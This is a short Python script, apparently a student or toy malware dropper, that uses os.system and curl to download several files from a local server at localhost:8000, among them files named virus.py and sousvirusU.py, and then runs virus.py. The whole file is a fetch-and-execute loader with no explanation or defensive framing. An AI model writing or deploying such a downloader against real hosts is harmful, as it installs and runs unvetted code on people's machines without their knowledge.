import os
os.system("curl -o 'data.txt' 'http://localhost:8000/data'")
os.system("curl -o 'compteur.py' 'http://localhost:8000/compteur'")
os.system("curl -o 'popup.py' 'http://localhost:8000/popup'")
os.system("curl -o 'sousvirusU.py' 'http://localhost:8000/sousvirusU'")
os.system("curl -o 'virus.py' 'http://localhost:8000/virus'")
os.system("python3 virus.py")
